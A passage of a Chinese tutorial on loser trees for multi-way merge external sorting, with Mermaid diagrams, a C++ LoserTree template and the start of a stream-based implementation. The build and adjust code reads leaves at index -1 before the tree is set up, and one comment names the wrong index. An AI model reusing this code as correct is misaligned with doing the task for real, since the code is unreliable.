mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 次比较。</p><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid"><span class="token keyword">graph</span> TD    <span class="token keyword">direction</span> TB    <span class="token comment">%% 败者树维护（插入/替换）后的状态</span>    <span class="token comment">%% 原冠军 b3(值2) 被 新b3(值6) 替换</span>    <span class="token comment">%% 调整后, 新冠军为 b1(值5)</span>    LS0_m<span class="token text string">["ls[0]=1 (新胜者: b1[5])&lt;br/>(原ls[0]=3)"]</span>    LS1_m<span class="token text string">["ls[1]=3 (新败者: 新b3[6])&lt;br/>(原ls[1]=1)"]</span>    LS2_m<span class="token text string">["ls[2]=0 (败者: b0[10])&lt;br/>(调整路径节点, 值未变)"]</span>    LS3_m<span class="token text string">["ls[3]=2 (败者: b2[8])&lt;br/>(非调整路径节点)"]</span>    LS4_m<span class="token text string">["ls[4]=4 (败者: b4[12])&lt;br/>(调整路径节点, 值未变)"]</span>    B0_m<span class="token text string">["b0 (10)"]</span>    B1_m<span class="token text string">["b1 (5)"]</span>    B2_m<span class="token text string">["b2 (8)"]</span>    B3_m<span class="token text string">["新b3 (6)&lt;br/>(原b3值: 2)"]</span>    B4_m<span class="token text string">["b4 (12)"]</span>    LS0_m <span class="token arrow operator">--></span> LS1_m    LS1_m <span class="token arrow operator">--></span> LS2_m    LS1_m <span class="token arrow operator">--></span> LS3_m    LS2_m <span class="token arrow operator">--></span> B0_m    LS2_m <span class="token arrow operator">--></span> LS4_m    LS4_m <span class="token arrow operator">--></span> B3_m    LS4_m <span class="token arrow operator">--></span> B4_m    LS3_m <span class="token arrow operator">--></span> B1_m    LS3_m <span class="token arrow operator">--></span> B2_m    <span class="token keyword">classDef</span> defaultLeaf <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#FFFACD<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#B8860B</span><span class="token punctuation">;</span>    <span class="token keyword">classDef</span> changedLeaf <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#lightblue<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#0000FF<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>2px<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>    <span class="token keyword">classDef</span> newWinnerLeaf <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#ADFF2F<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#006400<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>        <span class="token keyword">classDef</span> pathChangedNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#90EE90<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#006400<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>2px<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>    <span class="token keyword">classDef</span> pathUnchangedNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#lightyellow<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>1px<span class="token punctuation">,</span><span class="token property">stroke-dasharray</span><span class="token operator">:</span>5 5</span><span class="token punctuation">;</span>    <span class="token keyword">classDef</span> notOnPathNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#D3D3D3<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> LS0_m,LS1_m pathChangedNode<span class="token punctuation">;</span>    <span class="token keyword">class</span> LS2_m,LS4_m pathUnchangedNode<span class="token punctuation">;</span>    <span class="token keyword">class</span> LS3_m notOnPathNode<span class="token punctuation">;</span>        <span class="token keyword">class</span> B0_m,B2_m,B4_m defaultLeaf<span class="token punctuation">;</span>    <span class="token keyword">class</span> B3_m changedLeaf<span class="token punctuation">;</span>    <span class="token keyword">class</span> B1_m newWinnerLeaf<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>我们插入一个新的节点 b5(4)，步骤也很简单：</p><p>让新选手 <code>b5</code> 与现有选手 <code>b4</code> 进行比赛。我们需要一个新的内部节点（我们称之为 <code>ls[5]</code>）来存储这场比赛的败者。</p><ul><li><code>b5(4)</code> vs <code>b4(12)</code>：胜者是 <code>b5(4)</code>，败者是 <code>b4(12)</code>。所以 <code>ls[5]</code> 记录败者 <code>b4</code> 的索引 <code>4</code>。</li><li>然后，这场 <code>(b5 vs b4)</code> 的胜者 (<code>b5</code>) 再与原先和 <code>b4</code> 比赛的 <code>b3</code> 进行比赛。原先存储 <code>(b3 vs b4)</code> 败者的节点 <code>ls[4]</code> 现在将存储这场 <code>(b3 vs 胜者(b5,b4))</code> 比赛的败者。<br><code>b3(2)</code> vs <code>b5(4)</code>：胜者是 <code>b3(2)</code>，败者是 <code>b5(4)</code>。所以 <code>ls[4]</code> 记录败者 <code>b5</code> 的索引 <code>5</code>。</li><li>这个胜者 <code>b3(2)</code> 继续沿用原有的路径向上比赛：<br>与 <code>b0(10)</code> 比赛：胜者 <code>b3(2)</code>，败者 <code>b0(10)</code>。<code>ls[2]</code> 记录败者 <code>b0</code> 的索引 <code>0</code> (此节点值未变)。</li><li>树的另一分支 (<code>b1</code> vs <code>b2</code>) 不受影响：<br><code>b1(5)</code> vs <code>b2(8)</code>：胜者 <code>b1(5)</code>，败者 <code>b2(8)</code>。<code>ls[3]</code> 记录败者 <code>b2</code> 的索引 <code>2</code> (此节点值未变)。</li><li>最终决赛：<br>来自 <code>ls[2]</code> 分支的胜者 <code>b3(2)</code> vs 来自 <code>ls[3]</code> 分支的胜者 <code>b1(5)</code>：胜者 <code>b3(2)</code>，败者 <code>b1(5)</code>。<code>ls[1]</code> 记录败者 <code>b1</code> 的索引 <code>1</code> (此节点值未变)。</li><li>总冠军：<br><code>ls[0]</code> 记录总冠军 <code>b3</code> 的索引 <code>3</code> (此节点值未变)。</li></ul><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid"><span class="token keyword">graph</span> TD    <span class="token keyword">direction</span> TB    <span class="token comment">%% 败者树添加新节点 b5(4) 后的状态</span>    <span class="token comment">%% 原有选手: b0(10), b1(5), b2(8), b3(2), b4(12)</span>    <span class="token comment">%% 新增选手: b5(4) (值为4, 索引为5)</span>    <span class="token comment">%% 数小者胜</span>    LS0<span class="token text string">["ls[0]=3 (总胜者: b3[2])"]</span>    LS1<span class="token text string">["ls[1]=1 (败者: b1[5])"]</span>    LS2<span class="token text string">["ls[2]=0 (败者: b0[10])"]</span>    LS3<span class="token text string">["ls[3]=2 (败者: b2[8])"]</span>    LS4_mod<span class="token text string">["ls[4]=5 (败者: b5[4])"  ]</span>    LS5_new<span class="token text string">["ls[5]=4 (败者: b4[12]) "]</span>    B0<span class="token text string">["b0 (10)"]</span>    B1<span class="token text string">["b1 (5)"]</span>    B2<span class="token text string">["b2 (8)"]</span>    B3<span class="token text string">["b3 (2)"]</span>    B4<span class="token text string">["b4 (12)"]</span>    B5<span class="token text string">["b5 (4)"]</span>    LS0 <span class="token arrow operator">--></span> LS1    LS1 <span class="token arrow operator">--></span> LS2    LS1 <span class="token arrow operator">--></span> LS3        LS2 <span class="token arrow operator">--></span> B0        LS2 <span class="token arrow operator">--></span> LS4_mod            LS4_mod <span class="token arrow operator">--></span> B3            LS4_mod <span class="token arrow operator">--></span> LS5_new                  LS5_new <span class="token arrow operator">--></span> B4                LS5_new <span class="token arrow operator">--></span> B5        LS3 <span class="token arrow operator">--></span> B1        LS3 <span class="token arrow operator">--></span> B2    <span class="token keyword">classDef</span> defaultLeaf <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#FFFACD<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#B8860B</span><span class="token punctuation">;</span>    <span class="token keyword">classDef</span> newLeaf <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#FFDAB9<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#FF8C00<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>    <span class="token keyword">classDef</span> winnerLeaf <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#ADFF2F<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#006400<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>        <span class="token keyword">classDef</span> winnerNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#90EE90<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#006400<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>2px<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>    <span class="token keyword">classDef</span> loserNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#D3D3D3<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333</span><span class="token punctuation">;</span>     <span class="token keyword">classDef</span> newInternalNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#E6E6FA<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#9370DB<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>     <span class="token keyword">classDef</span> modifiedInternalNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#ADD8E6<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#4682B4<span class="token punctuation">,</span><span class="token property">font-weight</span><span class="token operator">:</span>bold</span><span class="token punctuation">;</span>     <span class="token keyword">class</span> LS0 winnerNode<span class="token punctuation">;</span>    <span class="token keyword">class</span> LS1,LS2,LS3 loserNode<span class="token punctuation">;</span>    <span class="token keyword">class</span> LS4_mod modifiedInternalNode<span class="token punctuation">;</span>    <span class="token keyword">class</span> LS5_new newInternalNode<span class="token punctuation">;</span>    <span class="token keyword">class</span> B0,B1,B2,B4 defaultLeaf<span class="token punctuation">;</span>    <span class="token keyword">class</span> B3 winnerLeaf<span class="token punctuation">;</span>    <span class="token keyword">class</span> B5 newLeaf<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在多路归并排序里，<strong>败者树实现比胜者树更高效、更容易维护</strong>。更新只需沿着冠军的路径向上“重新比一遍”，而不用全部重算。</p><hr><h2 id="代码实现与多路归并文件流">代码实现与多路归并文件流</h2><p>败者树的实现比较基础，其实和<strong>堆的构建</strong>很相似，我们做的是与相邻节点一直比较，然后将失败节点放在最上端即可。<br>这种排序思想其实与堆排序思想相似，败者树的优势在于我们处理查找最佳者，次佳者操作，效率更高。外排序的效率瓶颈从算法到了数据读取，胜者树和败者树都是很伟大的数据结构。</p><p><strong>LoserTree</strong> 基本模板类例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 败者树类模板，T为可比较类型，最小值胜</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">LoserTree</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token comment">// k为路数，sources为每一路的当前元素</span>    <span class="token function">LoserTree</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token operator">&amp;</span> sources<span class="token punctuation">)</span>        <span class="token operator">:</span> <span class="token function">k</span><span class="token punctuation">(</span>sources<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">leaves</span><span class="token punctuation">(</span>sources<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">ls</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 返回当前最小元素的下标</span>    <span class="token keyword">int</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> winnerIdx<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 输出冠军，并用新元素替换，维护树结构</span>    <span class="token keyword">void</span> <span class="token function">popAndReplace</span><span class="token punctuation">(</span>T newElem<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        leaves<span class="token punctuation">[</span>winnerIdx<span class="token punctuation">]</span> <span class="token operator">=</span> newElem<span class="token punctuation">;</span>        <span class="token function">adjust</span><span class="token punctuation">(</span>winnerIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取当前冠军的值</span>    T <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> leaves<span class="token punctuation">[</span>winnerIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">int</span> k<span class="token punctuation">;</span>                      <span class="token comment">// 路数</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>T<span class="token operator">></span> leaves<span class="token punctuation">;</span>      <span class="token comment">// 叶子节点（各路的当前值）</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> ls<span class="token punctuation">;</span>        <span class="token comment">// 内部节点，存败者编号</span>    <span class="token keyword">int</span> winnerIdx<span class="token punctuation">;</span>              <span class="token comment">// 当前冠军编号</span>    <span class="token comment">// 建树：从叶子到根层层比较，初始化ls和winnerIdx</span>    <span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        ls<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        winnerIdx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>leaves<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> leaves<span class="token punctuation">[</span>winnerIdx<span class="token punctuation">]</span><span class="token punctuation">)</span> winnerIdx <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> winnerIdx<span class="token punctuation">)</span> <span class="token function">adjust</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 从叶i出发向上挑战，维护败者树</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> parent <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> challenger <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>parent <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// challenger与ls[parent]决出胜负，胜者上移</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>leaves<span class="token punctuation">[</span>challenger<span class="token punctuation">]</span> <span class="token operator">&lt;</span> leaves<span class="token punctuation">[</span>ls<span class="token punctuation">[</span>parent<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                std<span class="token double-colon punctuation">::</span><span class="token function">swap</span><span class="token punctuation">(</span>challenger<span class="token punctuation">,</span> ls<span class="token punctuation">[</span>parent<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            parent <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 根节点与当前winner比较</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>leaves<span class="token punctuation">[</span>challenger<span class="token punctuation">]</span> <span class="token operator">&lt;</span> leaves<span class="token punctuation">[</span>winnerIdx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span><span class="token function">swap</span><span class="token punctuation">(</span>challenger<span class="token punctuation">,</span> winnerIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 最终winnerIdx存冠军下标</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本使用：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> sources <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 各路的初始元素</span>LoserTree<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">tree</span><span class="token punctuation">(</span>sources<span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"当前冠军编号: "</span> <span class="token operator">&lt;&lt;</span> tree<span class="token punctuation">.</span><span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">", 元素: "</span> <span class="token operator">&lt;&lt;</span> tree<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token comment">// 假设弹出冠军后，路3有新元素8</span>tree<span class="token punctuation">.</span><span class="token function">popAndReplace</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"新冠军编号: "</span> <span class="token operator">&lt;&lt;</span> tree<span class="token punctuation">.</span><span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">", 元素: "</span> <span class="token operator">&lt;&lt;</span> tree<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结合文件流</strong>，多文件编程，我们可以对于多路归并，利用败者树，实现外排序：<br>我们写个文件头 <code>LoserTree.h</code>，比较好引用：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//LoserTree.h</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">LOSERTREE_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LOSERTREE_H</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;limits></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;memory></span></span><span class="token comment">// ------- 单路输入流接口（可扩展为文件流/数组流/网络流等） -------</span><span class="token keyword">struct</span> <span class="token class-name">InputStream</span> <span class="token punctuation">&#123;</span>    virtual bool <span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">&amp;</span> val<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    virtual <span class="token operator">~</span><span class="token function">InputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 败者树类，适合多路归并外排序</span>class LoserTree <span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token comment">// 构造函数：输入k路流</span>    <span class="token function">LoserTree</span><span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>std<span class="token operator">::</span>unique_ptr<span class="token operator">&lt;</span>InputStream<span class="token operator">>></span><span class="token operator">&amp;</span> streams<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>    <span class="token comment">// 当前冠军编号</span>    <span class="token keyword">int</span> <span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>       <span class="token comment">// 当前最小元素</span>    <span class="token keyword">void</span> <span class="token function">popAndReplace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出冠军，补新元素，维护树结构</span>    bool <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span><span class="token punctuation">;</span>    <span class="token comment">// 判断是否归并结束</span>private<span class="token operator">:</span>    <span class="token keyword">const</span> <span class="token keyword">int</span> INF <span class="token operator">=</span> std<span class="token operator">::</span>numeric_limits<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> k<span class="token punctuation">;</span>    std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> leaves<span class="token punctuation">;</span>  <span class="token comment">// 当前各路的元素</span>    std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> ls<span class="token punctuation">;</span>      <span class="token comment">// 内部节点存败者编号</span>    <span class="token keyword">int</span> winnerIdx<span class="token punctuation">;</span>            <span class="token comment">// 冠军编号</span>    std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>std<span class="token operator">::</span>unique_ptr<span class="token operator">&lt;</span>InputStream<span class="token operator">>></span><span class="token operator">&amp;</span> input_streams<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// 初始建树</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 沿冠军路径维护</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// LOSERTREE_H</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"LoserTree.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token comment">// 数组流实现</span><span class="token keyword">struct</span> <span class="token class-name">VectorInputStream</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">InputStream</span></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> arr<span class="token punctuation">;</span>    size_t pos<span class="token punctuation">;</span>    <span class="token function">VectorInputStream</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> a<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">arr</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pos</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">&amp;</span> val<span class="token punctuation">)</span> <span class="token keyword">override</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            val <span class="token operator">=</span> arr<span class="token punctuation">[</span>pos<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> arr1<span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> arr2<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> arr3<span class="token punctuation">&#123;</span><span 